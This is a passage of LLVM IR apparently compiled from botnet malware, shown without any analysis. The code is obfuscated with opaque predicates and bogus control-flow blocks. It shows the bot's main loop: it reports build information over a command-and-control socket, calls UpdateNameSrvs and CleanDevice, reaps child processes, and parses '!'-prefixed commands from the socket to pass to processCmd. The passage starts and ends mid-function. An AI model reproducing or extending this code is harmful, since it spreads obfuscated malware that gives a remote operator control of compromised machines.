  %130 = call i8* @getBuild()
  %131 = call i32 @getEndianness()
  %132 = call i32 (i32, i8*, ...) @sockprintf(i32 %129, i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.206, i32 0, i32 0), i8* %130, i32 %131)
  call void @UpdateNameSrvs()
  call void @CleanDevice()
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %133

; <label>:133:                                    ; preds = %originalBBpart2109, %402, %286, %128
  %134 = load i32, i32* @mainCommSock, align 4
  %135 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %136 = call i32 @recvLine(i32 %134, i8* %135, i32 4096)
  store i32 %136, i32* %11, align 4
  %137 = icmp ne i32 %136, -1
  br i1 %137, label %138, label %676

; <label>:138:                                    ; preds = %133
  store i32 0, i32* %12, align 4
  br label %139

; <label>:139:                                    ; preds = %274, %138
  %140 = load i32, i32* %12, align 4
  %141 = sext i32 %140 to i64
  %142 = load i64, i64* @numpids, align 8
  %143 = icmp ult i64 %141, %142
  br i1 %143, label %144, label %277

; <label>:144:                                    ; preds = %139
  %145 = load i32, i32* @x.97
  %146 = load i32, i32* @y.98
  %147 = sub i32 %145, 1
  %148 = mul i32 %145, %147
  %149 = urem i32 %148, 2
  %150 = icmp eq i32 %149, 0
  %151 = icmp slt i32 %146, 10
  %152 = or i1 %150, %151
  br i1 %152, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %144
  %153 = load i32*, i32** @pids, align 8
  %154 = load i32, i32* %12, align 4
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds i32, i32* %153, i64 %155
  %157 = load i32, i32* %156, align 4
  %158 = call i32 @waitpid(i32 %157, i32* null, i32 1)
  %159 = icmp sgt i32 %158, 0
  %160 = load i32, i32* @x.97
  %161 = load i32, i32* @y.98
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %159, label %168, label %273

; <label>:168:                                    ; preds = %originalBBpart212
  %169 = load i32, i32* %12, align 4
  %170 = add nsw i32 %169, 1
  store i32 %170, i32* %14, align 4
  br label %171

; <label>:171:                                    ; preds = %originalBBpart220, %168
  %172 = load i32, i32* @x.97
  %173 = load i32, i32* @y.98
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %171
  %180 = load i32, i32* %14, align 4
  %181 = zext i32 %180 to i64
  %182 = load i64, i64* @numpids, align 8
  %183 = icmp ult i64 %181, %182
  %184 = load i32, i32* @x.97
  %185 = load i32, i32* @y.98
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %183, label %192, label %222

; <label>:192:                                    ; preds = %originalBBpart216
  %193 = load i32*, i32** @pids, align 8
  %194 = load i32, i32* %14, align 4
  %195 = zext i32 %194 to i64
  %196 = getelementptr inbounds i32, i32* %193, i64 %195
  %197 = load i32, i32* %196, align 4
  %198 = load i32*, i32** @pids, align 8
  %199 = load i32, i32* %14, align 4
  %200 = sub i32 %199, 1
  %201 = zext i32 %200 to i64
  %202 = getelementptr inbounds i32, i32* %198, i64 %201
  store i32 %197, i32* %202, align 4
  br label %203

; <label>:203:                                    ; preds = %192
  %204 = load i32, i32* @x.97
  %205 = load i32, i32* @y.98
  %206 = sub i32 %204, 1
  %207 = mul i32 %204, %206
  %208 = urem i32 %207, 2
  %209 = icmp eq i32 %208, 0
  %210 = icmp slt i32 %205, 10
  %211 = or i1 %209, %210
  br i1 %211, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %203
  %212 = load i32, i32* %14, align 4
  %213 = add i32 %212, 1
  store i32 %213, i32* %14, align 4
  %214 = load i32, i32* @x.97
  %215 = load i32, i32* @y.98
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %171

; <label>:222:                                    ; preds = %originalBBpart216
  %223 = load i32*, i32** @pids, align 8
  %224 = load i32, i32* %14, align 4
  %225 = sub i32 %224, 1
  %226 = zext i32 %225 to i64
  %227 = getelementptr inbounds i32, i32* %223, i64 %226
  store i32 0, i32* %227, align 4
  %228 = load i64, i64* @numpids, align 8
  %229 = add i64 %228, -1
  store i64 %229, i64* @numpids, align 8
  %230 = load i64, i64* @numpids, align 8
  %231 = add i64 %230, 1
  %232 = mul i64 %231, 4
  %233 = call noalias i8* @malloc(i64 %232) #5
  %234 = bitcast i8* %233 to i32*
  store i32* %234, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %235

; <label>:235:                                    ; preds = %originalBBpart231, %222
  %236 = load i32, i32* %14, align 4
  %237 = zext i32 %236 to i64
  %238 = load i64, i64* @numpids, align 8
  %239 = icmp ult i64 %237, %238
  br i1 %239, label %240, label %269

; <label>:240:                                    ; preds = %235
  %241 = load i32*, i32** @pids, align 8
  %242 = load i32, i32* %14, align 4
  %243 = zext i32 %242 to i64
  %244 = getelementptr inbounds i32, i32* %241, i64 %243
  %245 = load i32, i32* %244, align 4
  %246 = load i32*, i32** %13, align 8
  %247 = load i32, i32* %14, align 4
  %248 = zext i32 %247 to i64
  %249 = getelementptr inbounds i32, i32* %246, i64 %248
  store i32 %245, i32* %249, align 4
  br label %250

; <label>:250:                                    ; preds = %240
  %251 = load i32, i32* @x.97
  %252 = load i32, i32* @y.98
  %253 = sub i32 %251, 1
  %254 = mul i32 %251, %253
  %255 = urem i32 %254, 2
  %256 = icmp eq i32 %255, 0
  %257 = icmp slt i32 %252, 10
  %258 = or i1 %256, %257
  br i1 %258, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %250
  %259 = load i32, i32* %14, align 4
  %260 = add i32 %259, 1
  store i32 %260, i32* %14, align 4
  %261 = load i32, i32* @x.97
  %262 = load i32, i32* @y.98
  %263 = sub i32 %261, 1
  %264 = mul i32 %261, %263
  %265 = urem i32 %264, 2
  %266 = icmp eq i32 %265, 0
  %267 = icmp slt i32 %262, 10
  %268 = or i1 %266, %267
  br i1 %268, label %originalBBpart231, label %originalBB22alteredBB

originalBBpart231:                                ; preds = %originalBB22
  br label %235

; <label>:269:                                    ; preds = %235
  %270 = load i32*, i32** @pids, align 8
  %271 = bitcast i32* %270 to i8*
  call void @free(i8* %271) #5
  %272 = load i32*, i32** %13, align 8
  store i32* %272, i32** @pids, align 8
  br label %273

; <label>:273:                                    ; preds = %269, %originalBBpart212
  br label %274

; <label>:274:                                    ; preds = %273
  %275 = load i32, i32* %12, align 4
  %276 = add nsw i32 %275, 1
  store i32 %276, i32* %12, align 4
  br label %139

; <label>:277:                                    ; preds = %139
  %278 = load i32, i32* %11, align 4
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %279
  store i8 0, i8* %280, align 1
  %281 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %281)
  %282 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %283 = call i8* @strstr(i8* %282, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.181, i32 0, i32 0)) #9
  %284 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %285 = icmp eq i8* %283, %284
  br i1 %285, label %286, label %287

; <label>:286:                                    ; preds = %277
  br label %133

; <label>:287:                                    ; preds = %277
  %288 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %289 = call i8* @strstr(i8* %288, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.207, i32 0, i32 0)) #9
  %290 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %291 = icmp eq i8* %289, %290
  br i1 %291, label %292, label %293

; <label>:292:                                    ; preds = %287
  call void @exit(i32 0) #12
  unreachable

; <label>:293:                                    ; preds = %287
  %294 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %294, i8** %15, align 8
  %295 = load i8*, i8** %15, align 8
  %296 = load i8, i8* %295, align 1
  %297 = zext i8 %296 to i32
  %298 = icmp eq i32 %297, 33
  br i1 %298, label %299, label %659

; <label>:299:                                    ; preds = %293
  %300 = load i32, i32* @x.97
  %301 = load i32, i32* @y.98
  %302 = sub i32 %300, 1
  %303 = mul i32 %300, %302
  %304 = urem i32 %303, 2
  %305 = icmp eq i32 %304, 0
  %306 = icmp slt i32 %301, 10
  %307 = or i1 %305, %306
  br i1 %307, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %299
  %308 = load i8*, i8** %15, align 8
  %309 = getelementptr inbounds i8, i8* %308, i64 1
  store i8* %309, i8** %16, align 8
  %310 = load i32, i32* @x.97
  %311 = load i32, i32* @y.98
  %312 = sub i32 %310, 1
  %313 = mul i32 %310, %312
  %314 = urem i32 %313, 2
  %315 = icmp eq i32 %314, 0
  %316 = icmp slt i32 %311, 10
  %317 = or i1 %315, %316
  br i1 %317, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %318

; <label>:318:                                    ; preds = %originalBBpart247, %originalBBpart235
  %319 = load i8*, i8** %16, align 8
  %320 = load i8, i8* %319, align 1
  %321 = zext i8 %320 to i32
  %322 = icmp ne i32 %321, 32
  br i1 %322, label %323, label %344

; <label>:323:                                    ; preds = %318
  %324 = load i32, i32* @x.97
  %325 = load i32, i32* @y.98
  %326 = sub i32 %324, 1
  %327 = mul i32 %324, %326
  %328 = urem i32 %327, 2
  %329 = icmp eq i32 %328, 0
  %330 = icmp slt i32 %325, 10
  %331 = or i1 %329, %330
  br i1 %331, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %323
  %332 = load i8*, i8** %16, align 8
  %333 = load i8, i8* %332, align 1
  %334 = zext i8 %333 to i32
  %335 = icmp ne i32 %334, 0
  %336 = load i32, i32* @x.97
  %337 = load i32, i32* @y.98
  %338 = sub i32 %336, 1
  %339 = mul i32 %336, %338
  %340 = urem i32 %339, 2
  %341 = icmp eq i32 %340, 0
  %342 = icmp slt i32 %337, 10
  %343 = or i1 %341, %342
  br i1 %343, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br label %344

; <label>:344:                                    ; preds = %originalBBpart239, %318
  %345 = phi i1 [ false, %318 ], [ %335, %originalBBpart239 ]
  %346 = load i32, i32* @x.97
  %347 = load i32, i32* @y.98
  %348 = sub i32 %346, 1
  %349 = mul i32 %346, %348
  %350 = urem i32 %349, 2
  %351 = icmp eq i32 %350, 0
  %352 = icmp slt i32 %347, 10
  %353 = or i1 %351, %352
  br i1 %353, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %344
  %354 = load i32, i32* @x.97
  %355 = load i32, i32* @y.98
  %356 = sub i32 %354, 1
  %357 = mul i32 %354, %356
  %358 = urem i32 %357, 2
  %359 = icmp eq i32 %358, 0
  %360 = icmp slt i32 %355, 10
  %361 = or i1 %359, %360
  br i1 %361, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br i1 %345, label %362, label %381

; <label>:362:                                    ; preds = %originalBBpart243
  %363 = load i32, i32* @x.97
  %364 = load i32, i32* @y.98
  %365 = sub i32 %363, 1
  %366 = mul i32 %363, %365
  %367 = urem i32 %366, 2
  %368 = icmp eq i32 %367, 0
  %369 = icmp slt i32 %364, 10
  %370 = or i1 %368, %369
  br i1 %370, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %362
  %371 = load i8*, i8** %16, align 8
  %372 = getelementptr inbounds i8, i8* %371, i32 1
  store i8* %372, i8** %16, align 8
  %373 = load i32, i32* @x.97
  %374 = load i32, i32* @y.98
  %375 = sub i32 %373, 1
  %376 = mul i32 %373, %375
  %377 = urem i32 %376, 2
  %378 = icmp eq i32 %377, 0
  %379 = icmp slt i32 %374, 10
  %380 = or i1 %378, %379
  br i1 %380, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br label %318

; <label>:381:                                    ; preds = %originalBBpart243
  %382 = load i32, i32* @x.97
  %383 = load i32, i32* @y.98
  %384 = sub i32 %382, 1
  %385 = mul i32 %382, %384
  %386 = urem i32 %385, 2
  %387 = icmp eq i32 %386, 0
  %388 = icmp slt i32 %383, 10
  %389 = or i1 %387, %388
  br i1 %389, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %381
  %390 = load i8*, i8** %16, align 8
  %391 = load i8, i8* %390, align 1
  %392 = zext i8 %391 to i32
  %393 = icmp eq i32 %392, 0
  %394 = load i32, i32* @x.97
  %395 = load i32, i32* @y.98
  %396 = sub i32 %394, 1
  %397 = mul i32 %394, %396
  %398 = urem i32 %397, 2
  %399 = icmp eq i32 %398, 0
  %400 = icmp slt i32 %395, 10
  %401 = or i1 %399, %400
  br i1 %401, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br i1 %393, label %402, label %403

; <label>:402:                                    ; preds = %originalBBpart251
  br label %133

; <label>:403:                                    ; preds = %originalBBpart251
  %404 = load i8*, i8** %16, align 8
  store i8 0, i8* %404, align 1
  %405 = load i8*, i8** %15, align 8
  %406 = getelementptr inbounds i8, i8* %405, i64 1
  store i8* %406, i8** %16, align 8
  %407 = load i8*, i8** %15, align 8
  %408 = load i8*, i8** %16, align 8
  %409 = call i64 @strlen(i8* %408) #9
  %410 = getelementptr inbounds i8, i8* %407, i64 %409
  %411 = getelementptr inbounds i8, i8* %410, i64 2
  store i8* %411, i8** %15, align 8
  br label %412

; <label>:412:                                    ; preds = %originalBBpart261, %403
  %413 = load i8*, i8** %15, align 8
  %414 = load i8*, i8** %15, align 8
  %415 = call i64 @strlen(i8* %414) #9
  %416 = sub i64 %415, 1
  %417 = getelementptr inbounds i8, i8* %413, i64 %416
  %418 = load i8, i8* %417, align 1
  %419 = zext i8 %418 to i32
  %420 = icmp eq i32 %419, 10
  br i1 %420, label %430, label %421

; <label>:421:                                    ; preds = %412
  %422 = load i8*, i8** %15, align 8
  %423 = load i8*, i8** %15, align 8
  %424 = call i64 @strlen(i8* %423) #9
  %425 = sub i64 %424, 1
  %426 = getelementptr inbounds i8, i8* %422, i64 %425
  %427 = load i8, i8* %426, align 1
  %428 = zext i8 %427 to i32
  %429 = icmp eq i32 %428, 13
  br label %430

; <label>:430:                                    ; preds = %421, %412
  %431 = phi i1 [ true, %412 ], [ %429, %421 ]
  br i1 %431, label %432, label %454

; <label>:432:                                    ; preds = %430
  %433 = load i32, i32* @x.97
  %434 = load i32, i32* @y.98
  %435 = sub i32 %433, 1
  %436 = mul i32 %433, %435
  %437 = urem i32 %436, 2
  %438 = icmp eq i32 %437, 0
  %439 = icmp slt i32 %434, 10
  %440 = or i1 %438, %439
  br i1 %440, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %432
  %441 = load i8*, i8** %15, align 8
  %442 = load i8*, i8** %15, align 8
  %443 = call i64 @strlen(i8* %442) #9
  %444 = sub i64 %443, 1
  %445 = getelementptr inbounds i8, i8* %441, i64 %444
  store i8 0, i8* %445, align 1
  %446 = load i32, i32* @x.97
  %447 = load i32, i32* @y.98
  %448 = sub i32 %446, 1
  %449 = mul i32 %446, %448
  %450 = urem i32 %449, 2
  %451 = icmp eq i32 %450, 0
  %452 = icmp slt i32 %447, 10
  %453 = or i1 %451, %452
  br i1 %453, label %originalBBpart261, label %originalBB53alteredBB

originalBBpart261:                                ; preds = %originalBB53
  br label %412

; <label>:454:                                    ; preds = %430
  %455 = load i8*, i8** %15, align 8
  store i8* %455, i8** %17, align 8
  br label %456

; <label>:456:                                    ; preds = %484, %454
  %457 = load i8*, i8** %15, align 8
  %458 = load i8, i8* %457, align 1
  %459 = zext i8 %458 to i32
  %460 = icmp ne i32 %459, 32
  br i1 %460, label %461, label %482

; <label>:461:                                    ; preds = %456
  %462 = load i32, i32* @x.97
  %463 = load i32, i32* @y.98
  %464 = sub i32 %462, 1
  %465 = mul i32 %462, %464
  %466 = urem i32 %465, 2
  %467 = icmp eq i32 %466, 0
  %468 = icmp slt i32 %463, 10
  %469 = or i1 %467, %468
  br i1 %469, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %461
  %470 = load i8*, i8** %15, align 8
  %471 = load i8, i8* %470, align 1
  %472 = zext i8 %471 to i32
  %473 = icmp ne i32 %472, 0
  %474 = load i32, i32* @x.97
  %475 = load i32, i32* @y.98
  %476 = sub i32 %474, 1
  %477 = mul i32 %474, %476
  %478 = urem i32 %477, 2
  %479 = icmp eq i32 %478, 0
  %480 = icmp slt i32 %475, 10
  %481 = or i1 %479, %480
  br i1 %481, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  br label %482

; <label>:482:                                    ; preds = %originalBBpart265, %456
  %483 = phi i1 [ false, %456 ], [ %473, %originalBBpart265 ]
  br i1 %483, label %484, label %487

; <label>:484:                                    ; preds = %482
  %485 = load i8*, i8** %15, align 8
  %486 = getelementptr inbounds i8, i8* %485, i32 1
  store i8* %486, i8** %15, align 8
  br label %456

; <label>:487:                                    ; preds = %482
  %488 = load i32, i32* @x.97
  %489 = load i32, i32* @y.98
  %490 = sub i32 %488, 1
  %491 = mul i32 %488, %490
  %492 = urem i32 %491, 2
  %493 = icmp eq i32 %492, 0
  %494 = icmp slt i32 %489, 10
  %495 = or i1 %493, %494
  br i1 %495, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %487
  %496 = load i8*, i8** %15, align 8
  store i8 0, i8* %496, align 1
  %497 = load i8*, i8** %15, align 8
  %498 = getelementptr inbounds i8, i8* %497, i32 1
  store i8* %498, i8** %15, align 8
  %499 = load i8*, i8** %17, align 8
  store i8* %499, i8** %18, align 8
  %500 = load i32, i32* @x.97
  %501 = load i32, i32* @y.98
  %502 = sub i32 %500, 1
  %503 = mul i32 %500, %502
  %504 = urem i32 %503, 2
  %505 = icmp eq i32 %504, 0
  %506 = icmp slt i32 %501, 10
  %507 = or i1 %505, %506
  br i1 %507, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br label %508

; <label>:508:                                    ; preds = %528, %originalBBpart269
  %509 = load i32, i32* @x.97
  %510 = load i32, i32* @y.98
  %511 = sub i32 %509, 1
  %512 = mul i32 %509, %511
  %513 = urem i32 %512, 2
  %514 = icmp eq i32 %513, 0
  %515 = icmp slt i32 %510, 10
  %516 = or i1 %514, %515
  br i1 %516, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %508
  %517 = load i8*, i8** %18, align 8
  %518 = load i8, i8* %517, align 1
  %519 = icmp ne i8 %518, 0
  %520 = load i32, i32* @x.97
  %521 = load i32, i32* @y.98
  %522 = sub i32 %520, 1
  %523 = mul i32 %520, %522
  %524 = urem i32 %523, 2
  %525 = icmp eq i32 %524, 0
  %526 = icmp slt i32 %521, 10
  %527 = or i1 %525, %526
  br i1 %527, label %originalBBpart273, label %originalBB71alteredBB

originalBBpart273:                                ; preds = %originalBB71
  br i1 %519, label %528, label %537

; <label>:528:                                    ; preds = %originalBBpart273
  %529 = load i8*, i8** %18, align 8
  %530 = load i8, i8* %529, align 1
  %531 = zext i8 %530 to i32
  %532 = call i32 @toupper(i32 %531) #9
  %533 = trunc i32 %532 to i8
  %534 = load i8*, i8** %18, align 8
  store i8 %533, i8* %534, align 1
  %535 = load i8*, i8** %18, align 8
  %536 = getelementptr inbounds i8, i8* %535, i32 1
  store i8* %536, i8** %18, align 8
  br label %508

; <label>:537:                                    ; preds = %originalBBpart273
  store i32 1, i32* %20, align 4
  %538 = load i8*, i8** %15, align 8
  %539 = call i8* @strtok(i8* %538, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.208, i32 0, i32 0)) #5
  store i8* %539, i8** %21, align 8
  %540 = load i8*, i8** %17, align 8
  %541 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 0
  store i8* %540, i8** %541, align 16
  br label %542

; <label>:542:                                    ; preds = %621, %537
  %543 = load i32, i32* @x.97
  %544 = load i32, i32* @y.98
  %545 = sub i32 %543, 1
  %546 = mul i32 %543, %545
  %547 = urem i32 %546, 2
  %548 = icmp eq i32 %547, 0
  %549 = icmp slt i32 %544, 10
  %550 = or i1 %548, %549
  br i1 %550, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %542
  %551 = load i8*, i8** %21, align 8
  %552 = icmp ne i8* %551, null
  %553 = load i32, i32* @x.97
  %554 = load i32, i32* @y.98
  %555 = sub i32 %553, 1
  %556 = mul i32 %553, %555
  %557 = urem i32 %556, 2
  %558 = icmp eq i32 %557, 0
  %559 = icmp slt i32 %554, 10
  %560 = or i1 %558, %559
  br i1 %560, label %originalBBpart277, label %originalBB75alteredBB

originalBBpart277:                                ; preds = %originalBB75
  br i1 %552, label %561, label %623

; <label>:561:                                    ; preds = %originalBBpart277
  %562 = load i32, i32* @x.97
  %563 = load i32, i32* @y.98
  %564 = sub i32 %562, 1
  %565 = mul i32 %562, %564
  %566 = urem i32 %565, 2
  %567 = icmp eq i32 %566, 0
  %568 = icmp slt i32 %563, 10
  %569 = or i1 %567, %568
  br i1 %569, label %originalBB79, label %originalBB79alteredBB

originalBB79:                                     ; preds = %originalBB79alteredBB, %561
  %570 = load i8*, i8** %21, align 8
  %571 = load i8, i8* %570, align 1
  %572 = zext i8 %571 to i32
  %573 = icmp ne i32 %572, 10
  %574 = load i32, i32* @x.97
  %575 = load i32, i32* @y.98
  %576 = sub i32 %574, 1
  %577 = mul i32 %574, %576
  %578 = urem i32 %577, 2
  %579 = icmp eq i32 %578, 0
  %580 = icmp slt i32 %575, 10
  %581 = or i1 %579, %580
  br i1 %581, label %originalBBpart281, label %originalBB79alteredBB

originalBBpart281:                                ; preds = %originalBB79
  br i1 %573, label %582, label %621

; <label>:582:                                    ; preds = %originalBBpart281
  %583 = load i32, i32* @x.97
  %584 = load i32, i32* @y.98
  %585 = sub i32 %583, 1
  %586 = mul i32 %583, %585
  %587 = urem i32 %586, 2
  %588 = icmp eq i32 %587, 0
  %589 = icmp slt i32 %584, 10
  %590 = or i1 %588, %589
  br i1 %590, label %originalBB83, label %originalBB83alteredBB

originalBB83:                                     ; preds = %originalBB83alteredBB, %582
  %591 = load i8*, i8** %21, align 8
  %592 = call i64 @strlen(i8* %591) #9
  %593 = add i64 %592, 1
  %594 = call noalias i8* @malloc(i64 %593) #5
  %595 = load i32, i32* %20, align 4
  %596 = sext i32 %595 to i64
  %597 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %596
  store i8* %594, i8** %597, align 8
  %598 = load i32, i32* %20, align 4
  %599 = sext i32 %598 to i64
  %600 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %599
  %601 = load i8*, i8** %600, align 8
  %602 = load i8*, i8** %21, align 8
  %603 = call i64 @strlen(i8* %602) #9
  %604 = add i64 %603, 1
  call void @llvm.memset.p0i8.i64(i8* %601, i8 0, i64 %604, i32 1, i1 false)
  %605 = load i32, i32* %20, align 4
  %606 = sext i32 %605 to i64
  %607 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %606
  %608 = load i8*, i8** %607, align 8
  %609 = load i8*, i8** %21, align 8
  %610 = call i8* @strcpy(i8* %608, i8* %609) #5
  %611 = load i32, i32* %20, align 4
  %612 = add nsw i32 %611, 1
  store i32 %612, i32* %20, align 4
  %613 = load i32, i32* @x.97
  %614 = load i32, i32* @y.98
  %615 = sub i32 %613, 1
  %616 = mul i32 %613, %615
  %617 = urem i32 %616, 2
  %618 = icmp eq i32 %617, 0
  %619 = icmp slt i32 %614, 10
  %620 = or i1 %618, %619
  br i1 %620, label %originalBBpart2101, label %originalBB83alteredBB

originalBBpart2101:                               ; preds = %originalBB83
  br label %621

; <label>:621:                                    ; preds = %originalBBpart2101, %originalBBpart281
  %622 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.208, i32 0, i32 0)) #5
  store i8* %622, i8** %21, align 8
  br label %542

; <label>:623:                                    ; preds = %originalBBpart277
  %624 = load i32, i32* %20, align 4
  %625 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i32 0, i32 0
  call void @processCmd(i32 %624, i8** %625)
  %626 = load i32, i32* %20, align 4
  %627 = icmp sgt i32 %626, 1
  br i1 %627, label %628, label %658

; <label>:628:                                    ; preds = %623
  %629 = load i32, i32* @x.97
  %630 = load i32, i32* @y.98
  %631 = sub i32 %629, 1
  %632 = mul i32 %629, %631
  %633 = urem i32 %632, 2
  %634 = icmp eq i32 %633, 0
  %635 = icmp slt i32 %630, 10
  %636 = or i1 %634, %635
  br i1 %636, label %originalBB103, label %originalBB103alteredBB

originalBB103:                                    ; preds = %originalBB103alteredBB, %628
  store i32 1, i32* %22, align 4
  store i32 1, i32* %22, align 4
  %637 = load i32, i32* @x.97
  %638 = load i32, i32* @y.98
  %639 = sub i32 %637, 1
  %640 = mul i32 %637, %639
  %641 = urem i32 %640, 2
  %642 = icmp eq i32 %641, 0
  %643 = icmp slt i32 %638, 10
  %644 = or i1 %642, %643
  br i1 %644, label %originalBBpart2105, label %originalBB103alteredBB

originalBBpart2105:                               ; preds = %originalBB103
  br label %645

; <label>:645:                                    ; preds = %654, %originalBBpart2105
  %646 = load i32, i32* %22, align 4
  %647 = load i32, i32* %20, align 4
  %648 = icmp slt i32 %646, %647
  br i1 %648, label %649, label %657

; <label>:649:                                    ; preds = %645
  %650 = load i32, i32* %22, align 4
  %651 = sext i32 %650 to i64
  %652 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %651
  %653 = load i8*, i8** %652, align 8
  call void @free(i8* %653) #5
  br label %654

; <label>:654:                                    ; preds = %649
  %655 = load i32, i32* %22, align 4
  %656 = add nsw i32 %655, 1
  store i32 %656, i32* %22, align 4
  br label %645

; <label>:657:                                    ; preds = %645
  br label %658

; <label>:658:                                    ; preds = %657, %623
  br label %659

; <label>:659:                                    ; preds = %658, %293
  %660 = load i32, i32* @x.97
  %661 = load i32, i32* @y.98
  %662 = sub i32 %660, 1
  %663 = mul i32 %660, %662
  %664 = urem i32 %663, 2
  %665 = icmp eq i32 %664, 0
  %666 = icmp slt i32 %661, 10
  %667 = or i1 %665, %666
  br i1 %667, label %originalBB107, label %originalBB107alteredBB

originalBB107:                                    ; preds = %originalBB107alteredBB, %659
  %668 = load i32, i32* @x.97
  %669 = load i32, i32* @y.98
  %670 = sub i32 %668, 1
  %671 = mul i32 %668, %670
  %672 = urem i32 %671, 2
  %673 = icmp eq i32 %672, 0
  %674 = icmp slt i32 %669, 10
  %675 = or i1 %673, %674
  br i1 %675, label %originalBBpart2109, label %originalBB107alteredBB

originalBBpart2109:                               ; preds = %originalBB107
  br label %133

; <label>:676:                                    ; preds = %133
  br label %677

; <label>:677:                                    ; preds = %676, %120
  ret i32 0

originalBBalteredBB:                              ; preds = %originalBB, %48
  %678 = load i32, i32* %7, align 4
  %679 = call i32 @waitpid(i32 %678, i32* %9, i32 0)
  call void @exit(i32 0) #12
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %70
  %680 = call i32 @fork() #5
  store i32 %680, i32* %8, align 4
  %681 = icmp ne i32 %680, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %89
  call void @exit(i32 0) #12
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %144
  %682 = load i32*, i32** @pids, align 8
  %683 = load i32, i32* %12, align 4
  %684 = sext i32 %683 to i64
  %685 = getelementptr inbounds i32, i32* %682, i64 %684
  %686 = load i32, i32* %685, align 4
  %687 = call i32 @waitpid(i32 %686, i32* null, i32 1)
  %688 = icmp sgt i32 %687, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %171
  %689 = load i32, i32* %14, align 4
  %690 = zext i32 %689 to i64
  %691 = load i64, i64* @numpids, align 8
  %692 = icmp ult i64 %690, %691
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %203
  %693 = load i32, i32* %14, align 4
  %694 = add i32 %693, 1
  store i32 %694, i32* %14, align 4
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %250
  %695 = load i32, i32* %14, align 4
  %_ = sub i32 0, %695
  %gen = add i32 %_, 1
  %_23 = sub i32 0, %695
  %gen24 = add i32 %_23, 1
